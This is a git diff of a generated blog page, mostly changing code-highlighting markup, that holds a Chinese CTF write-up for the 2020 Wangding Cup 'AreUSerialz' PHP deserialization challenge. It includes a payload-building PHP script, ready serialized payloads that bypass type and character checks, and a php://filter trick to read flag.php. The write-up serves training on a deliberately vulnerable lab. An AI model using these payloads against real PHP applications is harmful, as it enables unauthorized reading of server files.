@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -246,7 +254,7 @@
             
             <div class="markdown-body">
               <h2 id="二十四、"><a href="#二十四、" class="headerlink" title="二十四、"></a>二十四、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[网鼎杯 2020 青龙组]AreUSerialz   </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
 <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);
 
@@ -326,19 +334,19 @@ highlight_file(<span class="hljs-keyword">__FILE__</span>);
         $obj = unserialize($str);
     &#125;
 
-&#125;</code></pre></div></code></pre>
+&#125;</code></pre></code></pre>
 <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>一大段代码，很可怕<br>通过<code>read()</code>函数中的<code>file_get_contents</code>和<code>process()</code>函数中的<code> $this-&gt;output($res);</code><br>我们应该利用这个读取到<code>flag.php</code><br>传一个序列化的$str,filename=flag.php,调用read()函数需要op==”2”;而析构函数里有个</p>
-<div class="hljs"><pre><code>if($this-&gt;op === &quot;2&quot;)
-     $this-&gt;op = &quot;1&quot;;     </code></pre></div>
+<pre><code>if($this-&gt;op === &quot;2&quot;)
+     $this-&gt;op = &quot;1&quot;;     </code></pre>
 <p>所以不能使<code>op===&quot;2&quot;</code>成立，运用弱类型让<code>op=2</code>即可          </p>
-<div class="hljs"><pre><code>function is_valid($s) &#123;
+<pre><code>function is_valid($s) &#123;
     for($i = 0; $i &lt; strlen($s); $i++)
         if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
             return false;
     return true;
-&#125;    </code></pre></div>
+&#125;    </code></pre>
 <p>这个要求$str的ASCII码必须在32~125之间<br>protected类在序列化后含有%00，其ASCII码为0<br>PHP7.1以上版本对属性类型不敏感，所以可以改成public类绕过       </p>
-<h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
+<h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;
 
     <span class="hljs-keyword">public</span> $op=<span class="hljs-number">2</span>;
@@ -349,11 +357,11 @@ highlight_file(<span class="hljs-keyword">__FILE__</span>);
 	$a=<span class="hljs-keyword">new</span> FileHandler();
 	$b=serialize($a);
 	<span class="hljs-keyword">echo</span> $b;
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
 <p>payload：<code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:5:&quot;hello&quot;;&#125;</code><br><img src="https://ftp.bmp.ovh/imgs/2021/02/7fca77026da21ca9.png" srcset="/img/loading.gif">  </p>
 <hr>
 <p>也可以使用伪协议  </p>
-<div class="hljs"><pre><code>public $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;     </code></pre></div>
+<pre><code>public $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;     </code></pre>
 <hr>
 <p>或者<br>不改类型，还是protected<br>将序列化后的字节流中用大写S表示表示字符串，此时这个字符串就支持将后面的字符串用16进制表示，就可以将<code>%00</code>替换为<code>\00</code><br>payload:<code>?str=O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:8:&quot;flag.php&quot;;S:10:&quot;\00*\00content&quot;;s:5:&quot;hello&quot;;&#125;</code></p>
 
@@ -500,6 +508,8 @@ highlight_file(<span class="hljs-keyword">__FILE__</span>);
 
 
 
+  
+    
   
 
 
